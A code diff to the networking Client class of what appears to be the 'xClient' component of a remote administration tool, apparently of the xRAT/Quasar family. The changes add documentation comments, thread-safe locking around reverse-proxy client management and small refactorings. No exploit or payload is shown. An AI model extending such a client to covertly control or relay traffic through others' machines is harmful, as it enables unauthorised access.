@@ -11,16 +11,29 @@ using xClient.Core.Extensions;
 using xClient.Core.Packets;
 using xClient.Core.ReverseProxy.Packets;
 using System.Collections.Generic;
+using System.Linq;
 using xClient.Core.ReverseProxy;
 
 namespace xClient.Core
 {
     public class Client
     {
+        /// <summary>
+        /// Occurs as a result of an unrecoverable issue with the client.
+        /// </summary>
         public event ClientFailEventHandler ClientFail;
 
+        /// <summary>
+        /// Represents a method that will handle failure of the client.
+        /// </summary>
+        /// <param name="s">The client that has failed.</param>
+        /// <param name="ex">The exception containing information about the cause of the client's failure.</param>
         public delegate void ClientFailEventHandler(Client s, Exception ex);
 
+        /// <summary>
+        /// Fires an event that informs subscribers that the client has failed.
+        /// </summary>
+        /// <param name="ex">The exception containing information about the cause of the client's failure.</param>
         private void OnClientFail(Exception ex)
         {
             if (ClientFail != null)
@@ -29,10 +42,22 @@ namespace xClient.Core
             }
         }
 
+        /// <summary>
+        /// Occurs when the state of the client has changed.
+        /// </summary>
         public event ClientStateEventHandler ClientState;
 
+        /// <summary>
+        /// Represents the method that will handle a change in the client's state
+        /// </summary>
+        /// <param name="s">The client which changed its state.</param>
+        /// <param name="connected">The new connection state of the client.</param>
         public delegate void ClientStateEventHandler(Client s, bool connected);
 
+        /// <summary>
+        /// Fires an event that informs subscribers that the state of the client has changed.
+        /// </summary>
+        /// <param name="connected">The new connection state of the client.</param>
         private void OnClientState(bool connected)
         {
             if (Connected == connected) return;
@@ -44,10 +69,22 @@ namespace xClient.Core
             }
         }
 
+        /// <summary>
+        /// Occurs when a packet is received from the server.
+        /// </summary>
         public event ClientReadEventHandler ClientRead;
 
+        /// <summary>
+        /// Represents a method that will handle a packet from the server.
+        /// </summary>
+        /// <param name="s">The client that has received the packet.</param>
+        /// <param name="packet">The packet that has been received by the server.</param>
         public delegate void ClientReadEventHandler(Client s, IPacket packet);
 
+        /// <summary>
+        /// Fires an event that informs subscribers that a packet has been received by the server.
+        /// </summary>
+        /// <param name="packet">The packet that has been received by the server.</param>
         private void OnClientRead(IPacket packet)
         {
             if (ClientRead != null)
@@ -56,10 +93,26 @@ namespace xClient.Core
             }
         }
 
+        /// <summary>
+        /// Occurs when a packet is sent by the client.
+        /// </summary>
         public event ClientWriteEventHandler ClientWrite;
 
+        /// <summary>
+        /// Represents the method that will handle the sent packet.
+        /// </summary>
+        /// <param name="s">The client that has sent the packet.</param>
+        /// <param name="packet">The packet that has been sent by the client.</param>
+        /// <param name="length">The length of the packet.</param>
+        /// <param name="rawData">The packet in raw bytes.</param>
         public delegate void ClientWriteEventHandler(Client s, IPacket packet, long length, byte[] rawData);
 
+        /// <summary>
+        /// Fires an event that informs subscribers that the client has sent a packet.
+        /// </summary>
+        /// <param name="packet">The packet that has been sent by the client.</param>
+        /// <param name="length">The length of the packet.</param>
+        /// <param name="rawData">The packet in raw bytes.</param>
         private void OnClientWrite(IPacket packet, long length, byte[] rawData)
         {
             if (ClientWrite != null)
@@ -68,17 +121,37 @@ namespace xClient.Core
             }
         }
 
+        /// <summary>
+        /// The type of the packet received.
+        /// </summary>
         public enum ReceiveType
         {
             Header,
             Payload
         }
 
+        /// <summary>
+        /// A list of all the connected proxy clients that this client holds.
+        /// </summary>
         private List<ReverseProxyClient> _proxyClients;
 
+        /// <summary>
+        /// Lock object for the list of proxy clients.
+        /// </summary>
+        private readonly object _proxyClientsLock = new object();
+
+        /// <summary>
+        /// Returns an array containing all of the proxy clients of this client.
+        /// </summary>
         public ReverseProxyClient[] ProxyClients
         {
-            get { return _proxyClients.ToArray(); }
+            get
+            {
+                lock (_proxyClientsLock)
+                {
+                    return _proxyClients.ToArray();
+                }
+            }
         }
 
         public const uint KEEP_ALIVE_TIME = 25000;
@@ -89,6 +162,9 @@ namespace xClient.Core
         private Socket _handle;
         private int _typeIndex;
 
+        /// <summary>
+        /// The buffer for the client's incoming and outgoing packets.
+        /// </summary>
         private byte[] _buffer = new byte[MAX_PACKET_SIZE];
 
         //receive info
@@ -98,7 +174,9 @@ namespace xClient.Core
         private int _payloadLen;
         private ReceiveType _receiveState = ReceiveType.Header;
 
-        //Connection info
+        /// <summary>
+        /// Gets if the client is currently connected to a server.
+        /// </summary>
         public bool Connected { get; private set; }
 
         private const bool encryptionEnabled = true;
@@ -108,6 +186,11 @@ namespace xClient.Core
         {
         }
 
+        /// <summary>
+        /// Attempts to connect to the specified host on the specified port.
+        /// </summary>
+        /// <param name="host">The host (or server) to connect to.</param>
+        /// <param name="port">The port of the host.</param>
         public void Connect(string host, ushort port)
         {
             try
@@ -131,14 +214,16 @@ namespace xClient.Core
             catch (Exception ex)
             {
                 OnClientFail(ex);
-                Disconnect();
             }
         }
 
         private void Initialize()
         {
             AddTypeToSerializer(typeof (IPacket), typeof (UnknownPacket));
-            _proxyClients = new List<ReverseProxyClient>();
+            lock (_proxyClientsLock)
+            {
+                _proxyClients = new List<ReverseProxyClient>();
+            }
         }
 
         private void AsyncReceive(IAsyncResult result)
@@ -249,9 +334,9 @@ namespace xClient.Core
                     Disconnect();
                 }
             }
-            catch
+            catch (Exception ex)
             {
-                Disconnect();
+                OnClientFail(ex);
             }
         }
 
@@ -301,12 +386,17 @@ namespace xClient.Core
             {
                 _handle.Send(payload);
             }
-            catch
+            catch (Exception ex)
             {
-                Disconnect();
+                OnClientFail(ex);
             }
         }
 
+        /// <summary>
+        /// Disconnect the client from the server, disconnect all proxies that
+        /// are held by this client, and dispose of other resources associated
+        /// with this client.
+        /// </summary>
         public void Disconnect()
         {
             OnClientState(false);
@@ -321,7 +411,7 @@ namespace xClient.Core
 
                 if(_proxyClients != null)
                 {
-                    lock(_proxyClients)
+                    lock (_proxyClientsLock)
                     {
                         foreach (ReverseProxyClient proxy in _proxyClients)
                             proxy.Disconnect();
@@ -334,61 +424,55 @@ namespace xClient.Core
         /// <summary>
         /// Adds a Type to the serializer so a message can be properly serialized.
         /// </summary>
-        /// <param name="parent">The parent type, i.e.: IPacket</param>
-        /// <param name="type">Type to be added</param>
+        /// <param name="parent">The parent type.</param>
+        /// <param name="type">Type to be added.</param>
         public void AddTypeToSerializer(Type parent, Type type)
         {
             if (type == null || parent == null)
                 throw new ArgumentNullException();
 
-            bool isAdded = false;
-            foreach (SubType subType in RuntimeTypeModel.Default[parent].GetSubtypes())
-                if (subType.DerivedType.Type == type)
-                {
-                    isAdded = true;
-                    break;
-                }
+            bool isAlreadyAdded = RuntimeTypeModel.Default[parent].GetSubtypes().Any(subType => subType.DerivedType.Type == type);
 
-            if (!isAdded)
+            if (!isAlreadyAdded)
                 RuntimeTypeModel.Default[parent].AddSubType(_typeIndex += 1, type);
         }
 
+        /// <summary>
+        /// Adds Types to the serializer.
+        /// </summary>
+        /// <param name="parent">The parent type, i.e.: IPacket</param>
+        /// <param name="types">Types to add.</param>
         public void AddTypesToSerializer(Type parent, params Type[] types)
         {
             foreach (Type type in types)
                 AddTypeToSerializer(parent, type);
         }
 
-        public void ConnectReverseProxy(ReverseProxyConnect Command)
+        public void ConnectReverseProxy(ReverseProxyConnect command)
         {
-            lock (_proxyClients)
+            lock (_proxyClientsLock)
             {
-                _proxyClients.Add(new ReverseProxyClient(Command, this));
+                _proxyClients.Add(new ReverseProxyClient(command, this));
             }
         }
 
-        public ReverseProxyClient GetReverseProxyByConnectionId(int ConnectionId)
+        public ReverseProxyClient GetReverseProxyByConnectionId(int connectionId)
         {
-            lock (_proxyClients)
+            lock (_proxyClientsLock)
             {
-                for (int i = 0; i < _proxyClients.Count; i++)
-                {
-                    if (_proxyClients[i].ConnectionId == ConnectionId)
-                        return _proxyClients[i];
-                }
-                return null;
+                return _proxyClients.FirstOrDefault(t => t.ConnectionId == connectionId);
             }
         }
 
-        public void RemoveProxyClient(int ConnectionId)
+        public void RemoveProxyClient(int connectionId)
         {
             try
             {
-                lock (_proxyClients)
+                lock (_proxyClientsLock)
                 {
                     for (int i = 0; i < _proxyClients.Count; i++)
                     {
-                        if (_proxyClients[i].ConnectionId == ConnectionId)
+                        if (_proxyClients[i].ConnectionId == connectionId)
                         {
                             _proxyClients.RemoveAt(i);
                             break;
